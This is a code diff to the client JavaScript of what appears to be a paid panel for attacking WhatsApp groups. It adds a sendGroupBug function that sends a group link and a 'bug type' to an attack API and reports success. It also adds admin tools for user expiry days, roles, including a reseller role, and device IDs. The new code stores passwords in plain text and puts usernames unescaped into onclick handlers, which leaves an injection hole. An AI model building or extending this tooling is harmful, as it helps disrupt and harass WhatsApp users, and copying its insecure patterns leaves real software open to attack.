@@ -501,6 +501,156 @@ async function deleteUser(username) {
 }
 
 // Load user list for admin
+// Send bug to WhatsApp group
+async function sendGroupBug() {
+  const whatsappGroup = document.getElementById('whatsappGroup').value.trim();
+  const bugType = document.getElementById('bugType').value;
+  const attackResult = document.getElementById('attackResult');
+
+  if (!whatsappGroup) {
+    showError(attackResult, 'Please enter WhatsApp group link');
+    return;
+  }
+
+  try {
+    const isConnected = await checkApiConnection();
+    if (!isConnected) {
+      showError(attackResult, 'API is currently unavailable');
+      return;
+    }
+
+    const response = await fetch(`${ATTACK_API_URL}?groupLink=${encodeURIComponent(whatsappGroup)}&type=${bugType}`);
+    
+    if (!response.ok) {
+      throw new Error("Failed to connect to server");
+    }
+
+    const result = await response.json();
+    
+    if (result.success) {
+      showSuccess(attackResult, `Bug sent successfully to WhatsApp group`);
+    } else {
+      showError(attackResult, result.message || 'Failed to send bug');
+    }
+  } catch (error) {
+    showError(attackResult, 'Failed to send bug: ' + error.message);
+  }
+}
+
+// User management functions
+async function addDaysToUser(username) {
+  const days = prompt('Enter number of days to add:', '30');
+  if (!days || isNaN(days)) return;
+
+  try {
+    const users = await getUsers();
+    const user = users.find(u => u.username === username);
+    if (!user) return;
+
+    const expiredDate = new Date(user.expired || new Date());
+    expiredDate.setDate(expiredDate.getDate() + parseInt(days));
+
+    const updatedUsers = users.map(u => 
+      u.username === username ? { ...u, expired: expiredDate.toISOString().split('T')[0] } : u
+    );
+
+    await updateUsers(updatedUsers);
+    loadUserList();
+    alert(`Added ${days} days to ${username}`);
+  } catch (error) {
+    console.error('Error adding days:', error);
+    alert('Failed to add days');
+  }
+}
+
+async function changeUserRole(username) {
+  const role = prompt('Enter new role (admin/reseller/user):', 'user');
+  if (!role || !['admin', 'reseller', 'user'].includes(role)) return;
+
+  try {
+    const users = await getUsers();
+    const updatedUsers = users.map(u => 
+      u.username === username ? { ...u, role } : u
+    );
+
+    await updateUsers(updatedUsers);
+    loadUserList();
+    alert(`Changed role for ${username} to ${role}`);
+  } catch (error) {
+    console.error('Error changing role:', error);
+    alert('Failed to change role');
+  }
+}
+
+async function changeUsername(oldUsername) {
+  const newUsername = prompt('Enter new username:', oldUsername);
+  if (!newUsername || newUsername === oldUsername) return;
+
+  try {
+    const users = await getUsers();
+    if (users.some(u => u.username === newUsername)) {
+      alert('Username already exists');
+      return;
+    }
+
+    const updatedUsers = users.map(u => 
+      u.username === oldUsername ? { ...u, username: newUsername } : u
+    );
+
+    await updateUsers(updatedUsers);
+    
+    // Update current user if it's them
+    if (currentUser.username === oldUsername) {
+      currentUser.username = newUsername;
+      localStorage.setItem('currentUser', JSON.stringify(currentUser));
+      document.getElementById('infoUsername').textContent = newUsername;
+    }
+    
+    loadUserList();
+    alert(`Username changed from ${oldUsername} to ${newUsername}`);
+  } catch (error) {
+    console.error('Error changing username:', error);
+    alert('Failed to change username');
+  }
+}
+
+async function changeUserPassword(username) {
+  const newPassword = prompt('Enter new password:');
+  if (!newPassword) return;
+
+  try {
+    const users = await getUsers();
+    const updatedUsers = users.map(u => 
+      u.username === username ? { ...u, password: newPassword } : u
+    );
+
+    await updateUsers(updatedUsers);
+    alert(`Password changed for ${username}`);
+  } catch (error) {
+    console.error('Error changing password:', error);
+    alert('Failed to change password');
+  }
+}
+
+async function resetDeviceId(username) {
+  if (!confirm(`Reset device ID for ${username}? This will log them out.`)) return;
+
+  try {
+    const users = await getUsers();
+    const updatedUsers = users.map(u => 
+      u.username === username ? { ...u, device_id: '' } : u
+    );
+
+    await updateUsers(updatedUsers);
+    loadUserList();
+    alert(`Device ID reset for ${username}`);
+  } catch (error) {
+    console.error('Error resetting device ID:', error);
+    alert('Failed to reset device ID');
+  }
+}
+
+// Update the loadUserList function to include all actions
 async function loadUserList() {
   const userListBody = document.getElementById('userListBody');
   userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">Loading users...</td></tr>';
@@ -517,10 +667,31 @@ async function loadUserList() {
     users.forEach(user => {
       const row = document.createElement('tr');
       
-      const actions = currentUser.role === 'admin' && user.username !== currentUser.username ? 
-        `<button class="btn btn-danger" onclick="deleteUser('${user.username}')">
-          <i class="fas fa-trash"></i> Delete
-        </button>` : '';
+      let actions = '';
+      if (currentUser.role === 'admin' && user.username !== currentUser.username) {
+        actions = `
+          <div style="display: flex; flex-wrap: wrap; gap: 5px;">
+            <button class="btn btn-danger" onclick="deleteUser('${user.username}')">
+              <i class="fas fa-trash"></i>
+            </button>
+            <button class="btn" onclick="addDaysToUser('${user.username}')">
+              <i class="fas fa-calendar-plus"></i>
+            </button>
+            <button class="btn" onclick="changeUserRole('${user.username}')">
+              <i class="fas fa-user-tag"></i>
+            </button>
+            <button class="btn" onclick="changeUsername('${user.username}')">
+              <i class="fas fa-user-edit"></i>
+            </button>
+            <button class="btn" onclick="changeUserPassword('${user.username}')">
+              <i class="fas fa-key"></i>
+            </button>
+            <button class="btn" onclick="resetDeviceId('${user.username}')">
+              <i class="fas fa-mobile-alt"></i>
+            </button>
+          </div>
+        `;
+      }
       
       row.innerHTML = `
         <td>${user.username}</td>
